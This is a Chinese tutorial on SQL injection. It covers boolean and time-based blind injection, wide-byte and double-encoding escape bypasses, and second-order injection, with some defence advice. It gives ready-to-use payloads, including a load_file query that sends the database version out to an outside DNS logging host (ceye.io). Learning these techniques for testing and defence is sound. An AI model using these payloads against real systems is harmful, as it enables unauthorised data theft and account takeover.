<a name="Bd1pb"></a>
## SQL盲注
<a name="liy90"></a>
### 盲注
当注入语句被带入数据库查询，页面确不能回显结果，如应用程序就会返回一个“通用的”的页面或特定的语句，不能以此来判断注入是否成功，这种情况下就要用到sql盲注的技巧了。<br />sql盲注三个分类：

1. 布尔盲注
2. 时间盲注
3. dnslog盲注
<a name="Xo3Bo"></a>
### 布尔盲注
<a name="FxHM0"></a>
#### 布尔盲注原理
只返回布尔值的sql注入漏洞，通过构造语句，来判断数据库信息的正确性，再通过页面反回的布尔值，来判断正确与否
<a name="Ajlja"></a>
#### 布尔盲注方法
```
#substr()函数,截取某个字符串，与后面的字符串或数字对比
k' and substr((select database()),1,1)='s'
#left()函数,截取前几个字符与期望值对比
k' and left((database()),1)='s'
#regexp函数,用正则判断
k' and select user() regexp '^r'
#like函数
k' and select user() like 'ro%'
# 爆破库、表、字段长度
k' and select length(database())<xx

#有些sql漏洞中,会屏蔽引号,因此更多采用将截取出来的字符串转为ascii码,再对比ascii码值
#ascii和ord函数功能相同,大于、小于、等于配合二分法使用
k' and ascii(substr((select database()),1,1))=114
k' and ascii(substr((select database()),1,1))>114
k' and ascii(substr((select database()),1,1))<20

ord(substr((select database()),1,1))=114
```
<a name="OlLPd"></a>
### 时间盲注
<a name="sHkQT"></a>
#### 时间盲注原理
语句执行后，不回显，不报错，不提示真假的sql注入漏洞。可以通过构造语句，通过条件语句判断，为真则立即执行，否则延时执行
```
#确实是否有注入点，如果相应时间是自定义的睡眠时间，则大概率有注入点
k' and sleep(x) #
#然后通过之前的函数，猜测库、表、字段
k' and if(ascii(substr(database(),1,1))>115,0,sleep(5));

#也可以先通过sleep计算出库、表、字段长度
k' and sleep(length(database()))
```
<a name="cnc0d"></a>
### dnslog盲注
<a name="Xh7Hy"></a>
#### dnslog盲注原理

1. 首先需要存在sql注入漏洞，但不回显，常规只能用布尔盲注和时间盲注猜单词
2. 但是利用Mysql `load_file()`函数(唯windowns)，可以用sql语句发起web请求
3. 将我们盲注需要获取的信息，通过二级域名的方式，发起web请求
4. 利用特定的dns解析网站，获取这些二级域名的记录，就能得到数据

前提要求

1. windows系统
2. 该用户具有file权限
3. `SHOW VARIABLES LIKE 'secure_file_priv'`结果为NULL
<a name="vqKEb"></a>
#### dnslog盲注方法
登录[http://ceye.io/](http://ceye.io/)网站并注册，得到属于自己的identifier 先尝试在终端运行`curl test.xxxx.ceye.io`，在解析记录就可以看到对应记录 在windows系统下，使用`load_file()`发起如下类似请求：
```sql
select load_file(concat('\\\\',(select version()),'.xxxx.ceye.io\\abc'))
```
如果解析记录有结果，后续就可以用sql注入的其他语法自由发挥了有些特殊符号不能作为二级域名，通用的方法是用hex()转换为16进制处理
<a name="kJzGO"></a>
## 其他SQL注入方法
都是面对php代码或配置，对输入的单引号进行转义时，在处理用户输入数据时存在问题，可以绕过转义
<a name="dD1TI"></a>
### 宽字节注入
dbk处理编码的过程存在问题，可以构造数据消灭转义符\
<a name="MiaRS"></a>
#### 宽字节注入原理
在对单双引号进行了转义过滤的情况下，前面的注入方式都不好使，但可以在引号前加上%df再进行sql注入尝试<br />它的原理是

1. `\'`编码后的值为`%5C%27`
2. 使用GBK编码数据库时，两个字符为一个汉字
3. ASCII码只有128个，大于128的，就会和第二个字符组成一个汉字
4. 使用`%df\'`，编码后为`%df%5C%27`<br />第一个码大于128，因此会使用前两个字符運，最后单剩一个引号<br />即编码后的值为運'
5. 然后就可以正常进行sql注入了
<a name="gxaPC"></a>
#### 宽字节注入方法
黑盒测试的话：在可能的注入点后，键入%df'后，进行测试<br />白合测试的话：

1. 查看mysql编码是否为GBK
2. 是否使用`preg_replace`转换单引号为`\'`
3. 是否使用addslashes进行转义
4. 是否使用mysql_real_escape_string进行转义
<a name="nPyF6"></a>
#### 宽字节注入防范

1. 使用utf-8，可以避免宽字节注入<br />不仅在gbk中，韩文、日文等都是宽字节
2. 使用`mysql_real_escape_string`方法转义<br />需同时设置`mysql_set_charset('gbk',$conn)`
3. 可以设置mysql连接参数：`character_set_clinet=binary`
<a name="oFP57"></a>
### 二次编码注入
php代码中用了`urldecode()`等编码函数，对url中的特殊字符进行编码，可以利用此函数与php自身编码转换，产生漏洞
<a name="d6lua"></a>
#### 二次编码注入原理

1. 用户输入`id=1%27`，会被php转码为`id=1'`
2. 转义代码发现有单引号，转义为`id=1\'`，无法sql注入
3. 用户输入`id=1%2527`，由于%25转码后就是%，因而会转码为id=1%27
4. 转义代码没有发现单引号，故不转义
5. 但后续urldecode等函数，处理url时，会将`id=1%27`转码为`id=1'`，就可以注入<br />注意：如果做白盒测试，要看urldecode函数 是否在转义方法之后
<a name="CPEGv"></a>
### 二次注入
<a name="BdQsi"></a>
#### 二次注入原理

1. 插入恶意数据<br />有些程序在进行数据库插入的时候，仅仅对特殊字符进行了转义，但仍然将数据写入了数据库，如果插入的数据包含恶意内容的话
2. 引用恶意数据<br />在插入到数据库中后，在另外的地方查询该数据的时候，如果没有对取出的数据做校验处理(即认为可信)，直接使用该数据，就会造成sql二次注入
<a name="shTsT"></a>
#### 二次注入举例
举例1如下：

1. 新建用户admin'#，有特殊字符，但写入成功，并能使用该用户登录
2. 正常修改用户密码时<br />sql语句如是：`update user set password='1234' where username='x' and psssword='xx'`
3. 但当用户为admin'#时<br />sql语句变为：`update user set password='1234' where username='admin'#' and xxxxx`<br />明显井号后的语句都被注释掉了
4. 结果就是会修改掉原有用户admin的密码

举例2如下：

1. 有两个页面，一个页面写入数据，另一个页面可以有办法查看该数据
2. 如果写入时，写入了`xx' union select 1,database(),3`
3. 如果存在sql注入漏洞，写入的数据应该为1，库名，3
4. 在另一个页面就可以看到该库名数据
<a name="Sl1sQ"></a>
#### 二次注入防御

1. 对外部提交的数，需要更加谨慎处理，特殊字符不写入
2. 程序内部的数据调用，也要进行严格检查，不要认为可信
